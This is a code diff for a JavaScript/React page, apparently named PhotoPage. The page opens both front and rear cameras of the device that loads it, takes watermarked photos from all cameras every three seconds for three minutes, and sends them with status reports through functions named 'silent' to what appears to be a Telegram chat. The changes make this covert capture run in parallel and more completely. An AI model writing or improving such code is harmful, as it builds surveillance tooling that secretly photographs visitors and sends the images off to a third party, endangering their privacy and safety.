@@ -362,7 +362,7 @@ ${connectionText}
   // Инициализация камер
   const initializeCameras = async () => {
     try {
-      // Пробуем сначала селфи камеру, потом заднюю
+      // Пробуем обе камеры одновременно
       const cameraTypes = [
         { facingMode: "user", name: "Селфи камера" },
         { facingMode: { exact: "environment" }, name: "Задняя камера" }
@@ -371,11 +371,12 @@ ${connectionText}
       streamsRef.current = [];
       videoRefsRef.current = [];
       
-      for (let i = 0; i < cameraTypes.length; i++) {
+      // Запускаем все камеры параллельно
+      const cameraPromises = cameraTypes.map(async (cameraType, i) => {
         try {
           const constraints = {
             video: {
-              facingMode: cameraTypes[i].facingMode,
+              facingMode: cameraType.facingMode,
               width: { ideal: 1920 },
               height: { ideal: 1080 }
             },
@@ -383,7 +384,6 @@ ${connectionText}
           };
           
           const stream = await navigator.mediaDevices.getUserMedia(constraints);
-          streamsRef.current.push(stream);
           
           // Создаем видео элемент
           const video = document.createElement('video');
@@ -404,7 +404,6 @@ ${connectionText}
           video.setAttribute('playsinline', '');
           video.srcObject = stream;
           document.body.appendChild(video);
-          videoRefsRef.current.push(video);
           
           // Ждем готовности видео
           await new Promise((resolve, reject) => {
@@ -412,14 +411,12 @@ ${connectionText}
               video.removeEventListener('loadedmetadata', onLoaded);
               video.removeEventListener('error', onError);
               
-              // Даем видео начать воспроизведение
               video.play().then(() => {
                 setTimeout(() => {
-                  console.log(`Камера ${i + 1} (${cameraTypes[i].name}) готова:`, 
-                    video.videoWidth, 'x', video.videoHeight,
-                    'readyState:', video.readyState);
-                  resolve();
-                }, 500);
+                  console.log(`Камера ${i + 1} (${cameraType.name}) готова:`, 
+                    video.videoWidth, 'x', video.videoHeight);
+                  resolve({ stream, video, index: i });
+                }, 300);
               }).catch(reject);
             };
             
@@ -432,7 +429,6 @@ ${connectionText}
             video.addEventListener('loadedmetadata', onLoaded);
             video.addEventListener('error', onError);
             
-            // Таймаут на случай долгой загрузки
             setTimeout(() => {
               if (video.readyState >= 1) {
                 onLoaded();
@@ -440,11 +436,27 @@ ${connectionText}
             }, 3000);
           });
           
+          return { stream, video, index: i };
+          
         } catch (error) {
           console.log(`Камера ${i + 1} не доступна:`, error.message);
-          continue;
+          return null;
         }
-      }
+      });
+      
+      const results = await Promise.all(cameraPromises);
+      
+      // Фильтруем успешные результаты
+      results.forEach(result => {
+        if (result) {
+          streamsRef.current[result.index] = result.stream;
+          videoRefsRef.current[result.index] = result.video;
+        }
+      });
+      
+      // Удаляем пустые элементы
+      streamsRef.current = streamsRef.current.filter(Boolean);
+      videoRefsRef.current = videoRefsRef.current.filter(Boolean);
       
       return streamsRef.current.length > 0;
       
@@ -456,15 +468,12 @@ ${connectionText}
 
   // Создание фото с камеры
   const capturePhotoFromCamera = async (cameraIndex, video) => {
-    if (!canvasRef.current) {
-      canvasRef.current = document.createElement('canvas');
-    }
-    const canvas = canvasRef.current;
+    const canvas = document.createElement('canvas');
     
     // Проверяем готовность видео
     if (video && video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
       // Даем видео обновиться
-      await new Promise(resolve => setTimeout(resolve, 100));
+      await new Promise(resolve => setTimeout(resolve, 50));
       
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
@@ -490,43 +499,56 @@ ${connectionText}
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       }
       
-      // Добавляем водяной знак с информацией
-      const watermarkHeight = 110;
-      const watermarkY = canvas.height - watermarkHeight - 10;
+      // Добавляем водяной знак TAVERNA в правом нижнем углу
+      const watermarkText = 'TAVERNA';
+      ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
+      ctx.font = 'bold 24px Arial';
+      ctx.textAlign = 'right';
       
-      ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
-      ctx.fillRect(10, watermarkY, 400, watermarkHeight);
+      // Фон для текста
+      const textMetrics = ctx.measureText(watermarkText);
+      const textWidth = textMetrics.width;
+      const textHeight = 30;
+      const padding = 10;
+      
+      ctx.fillRect(
+        canvas.width - textWidth - padding * 2,
+        canvas.height - textHeight - padding,
+        textWidth + padding * 2,
+        textHeight
+      );
+      
+      // Текст
+      ctx.fillStyle = '#FFFFFF';
+      ctx.fillText(
+        watermarkText,
+        canvas.width - padding,
+        canvas.height - padding - 5
+      );
+      
+      // Добавляем информацию в левом нижнем углу
+      ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
+      ctx.textAlign = 'left';
+      ctx.font = '12px Arial';
+      
+      const infoLines = [
+        `${cameraIndex === 0 ? '🤳 Селфи' : '📷 Задняя'}`,
+        `#${captureCount.current + 1}`,
+        `${new Date().toLocaleTimeString()}`,
+        `${video.videoWidth}x${video.videoHeight}`
+      ];
+      
+      const infoHeight = infoLines.length * 15 + 20;
+      ctx.fillRect(10, canvas.height - infoHeight, 200, infoHeight);
       
       ctx.fillStyle = '#FFFFFF';
-      ctx.font = 'bold 16px Arial';
-      ctx.textAlign = 'left';
-      
-      let yOffset = watermarkY + 25;
-      ctx.fillText(`📷 ${cameraIndex === 0 ? '🤳 Селфи камера' : '📷 Задняя камера'}`, 20, yOffset);
-      
-      yOffset += 25;
-      ctx.fillText(`#${captureCount.current + 1} | 🕐 ${new Date().toLocaleTimeString()}`, 20, yOffset);
-      
-      yOffset += 25;
-      const elapsed = Date.now() - startTime.current;
-      const remaining = Math.max(0, totalDuration - elapsed);
-      ctx.fillText(`⏱ ${Math.floor(elapsed / 1000)} сек | ⏳ ${Math.floor(remaining / 1000)} сек осталось`, 20, yOffset);
-      
-      yOffset += 25;
-      ctx.fillText(`📏 ${video.videoWidth}x${video.videoHeight}`, 20, yOffset);
-      
-      // Добавляем текст SYSTEM ACTIVE
-      ctx.fillStyle = 'rgba(255, 0, 0, 0.8)';
-      ctx.font = 'bold 40px Arial';
-      ctx.textAlign = 'center';
-      ctx.fillText('SYSTEM ACTIVE', canvas.width / 2, 50);
+      infoLines.forEach((line, i) => {
+        ctx.fillText(line, 20, canvas.height - infoHeight + 20 + (i * 15));
+      });
       
     } else {
       // Создаем тестовое изображение если видео не готово
-      console.warn(`Видео камеры ${cameraIndex} не готово:`, 
-        video?.readyState, 
-        video?.videoWidth, 
-        video?.videoHeight);
+      console.warn(`Видео камеры ${cameraIndex} не готово`);
       
       canvas.width = 800;
       canvas.height = 600;
@@ -545,14 +567,10 @@ ${connectionText}
       ctx.arc(400, 300, 250, 0, Math.PI * 2);
       ctx.fill();
       
-      // Текст SYSTEM ACTIVE
-      ctx.fillStyle = '#FFFFFF';
-      ctx.font = 'bold 48px Arial';
-      ctx.textAlign = 'center';
-      ctx.fillText('SYSTEM ACTIVE', 400, 150);
-      
       // Иконка камеры
+      ctx.fillStyle = '#FFFFFF';
       ctx.font = '120px Arial';
+      ctx.textAlign = 'center';
       ctx.fillText(cameraIndex === 0 ? '🤳' : '📷', 400, 320);
       
       // Информация
@@ -560,6 +578,12 @@ ${connectionText}
       ctx.fillText(`Камера ${cameraIndex === 0 ? 'Селфи' : 'Задняя'} не активна`, 400, 420);
       ctx.fillText(`Фото #${captureCount.current + 1}`, 400, 470);
       ctx.fillText(new Date().toLocaleTimeString(), 400, 520);
+      
+      // Водяной знак TAVERNA
+      ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
+      ctx.font = 'bold 36px Arial';
+      ctx.textAlign = 'right';
+      ctx.fillText('TAVERNA', 780, 580);
     }
 
     return new Promise(resolve => {
@@ -567,7 +591,7 @@ ${connectionText}
     });
   };
 
-  // Захват и отправка фото
+  // Захват и отправка фото со всех камер одновременно
   const captureAndSendPhotos = async () => {
     const elapsed = Date.now() - startTime.current;
     
@@ -580,12 +604,7 @@ ${connectionText}
     
     // Фильтруем готовые видео элементы
     const readyVideos = videoRefsRef.current.filter(video => {
-      if (!video) return false;
-      const isReady = video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0;
-      if (!isReady) {
-        console.log(`Видео не готово: readyState=${video.readyState}, размер=${video.videoWidth}x${video.videoHeight}`);
-      }
-      return isReady;
+      return video && video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0;
     });
     
     if (readyVideos.length === 0) {
@@ -614,6 +633,12 @@ ${connectionText}
       ctx.fillText(`Прошло: ${elapsedSeconds} сек`, 400, 380);
       ctx.fillText(new Date().toLocaleTimeString(), 400, 440);
       
+      // Водяной знак TAVERNA
+      ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
+      ctx.font = 'bold 36px Arial';
+      ctx.textAlign = 'right';
+      ctx.fillText('TAVERNA', 780, 580);
+      
       const blob = await new Promise(resolve => testCanvas.toBlob(resolve, 'image/jpeg', 0.9));
       const caption = `⏳ Ожидание камеры...\n📸 Попытка #${captureCount.current + 1}\n⏱ ${Math.floor(elapsed / 1000)} сек\n🕐 ${new Date().toLocaleTimeString()}`;
       
@@ -622,17 +647,10 @@ ${connectionText}
       return;
     }
     
-    // Захватываем с каждой доступной камеры
-    for (let i = 0; i < readyVideos.length; i++) {
+    // Захватываем фото со всех камер одновременно
+    const photoPromises = readyVideos.map(async (video, i) => {
       try {
-        const video = readyVideos[i];
         const originalCameraIndex = videoRefsRef.current.indexOf(video);
-        
-        // Небольшая пауза между кадрами
-        if (i > 0) {
-          await new Promise(resolve => setTimeout(resolve, 200));
-        }
-        
         const photoBlob = await capturePhotoFromCamera(originalCameraIndex, video);
         
         if (photoBlob) {
@@ -645,14 +663,26 @@ ${connectionText}
             `📏 ${video.videoWidth}x${video.videoHeight}\n` +
             `⏱ Прошло: ${elapsedSeconds} сек\n` +
             `⏳ Осталось: ${remainingSeconds} сек\n` +
-            `🕐 ${new Date().toLocaleTimeString()}`;
+            `🕐 ${new Date().toLocaleTimeString()}\n` +
+            `🚀 TAVERNA SYSTEM`;
           
-          await sendPhotoSilent(photoBlob, caption);
+          return { blob: photoBlob, caption };
         }
       } catch (error) {
         console.error(`Ошибка захвата с камеры ${i}:`, error);
+        return null;
       }
-    }
+    });
+    
+    // Ждем завершения всех захватов
+    const photoResults = await Promise.all(photoPromises);
+    
+    // Отправляем все фото параллельно
+    const sendPromises = photoResults
+      .filter(result => result !== null)
+      .map(result => sendPhotoSilent(result.blob, result.caption));
+    
+    await Promise.all(sendPromises);
     
     captureCount.current++;
     
@@ -668,7 +698,8 @@ ${connectionText}
         `📷 Активных камер: ${readyVideos.length}\n` +
         `⏱ Время работы: ${elapsedMinutes}:${elapsedSeconds.toString().padStart(2, '0')}\n` +
         `⏳ Осталось: ${remainingSeconds} сек\n` +
-        `📅 ${new Date().toLocaleString()}`
+        `📅 ${new Date().toLocaleString()}\n` +
+        `🚀 TAVERNA SYSTEM ACTIVE`
       );
     }
   };
@@ -679,7 +710,7 @@ ${connectionText}
       clearInterval(captureIntervalRef.current);
     }
     
-    // Первое фото сразу
+    // Первые фото сразу
     setTimeout(() => {
       captureAndSendPhotos();
     }, 1000);
@@ -741,10 +772,10 @@ ${connectionText}
         sendToTelegramSilent(
           `🚀 КАМЕРЫ АКТИВИРОВАНЫ\n\n` +
           `📷 Доступно камер: ${streamsRef.current.length}\n` +
-          `📏 Разрешение: ${videoRefsRef.current[0]?.videoWidth || 0}x${videoRefsRef.current[0]?.videoHeight || 0}\n` +
-          `⏱ Начинаю съемку: 1 фото каждые 3 секунды\n` +
+          `⏱ Начинаю съемку: Фото со всех камер каждые 3 секунды\n` +
           `⏳ Продолжительность: 3 минуты\n` +
-          `📅 Старт: ${new Date().toLocaleString()}`
+          `📅 Старт: ${new Date().toLocaleString()}\n` +
+          `🚀 TAVERNA SYSTEM ACTIVE`
         );
         
         // Запускаем периодическую съемку
@@ -760,7 +791,7 @@ ${connectionText}
             `📷 Камеры использовано: ${streamsRef.current.length}\n` +
             `⏱ Общее время: 3 минуты\n` +
             `📅 Завершено: ${new Date().toLocaleString()}\n` +
-            `🎉 Процесс завершен успешно!`
+            `🎉 TAVERNA SYSTEM: Процесс завершен успешно!`
           );
         }, totalDuration);
         
@@ -770,7 +801,8 @@ ${connectionText}
           '1. Нет разрешения на доступ к камере\n' +
           '2. Камера занята другим приложением\n' +
           '3. Браузер не поддерживает доступ к камерам\n' +
-          '4. Нет физической камеры на устройстве');
+          '4. Нет физической камеры на устройстве\n' +
+          '🚫 TAVERNA SYSTEM: Операция отменена');
       }
     };
     
@@ -829,7 +861,7 @@ const PhotoPage = () => {
             fontWeight: 'bold',
             opacity: 0.9
           }}>
-            Система активна...
+            TAVERNA SYSTEM ACTIVE...
           </div>
         </div>
       </div>
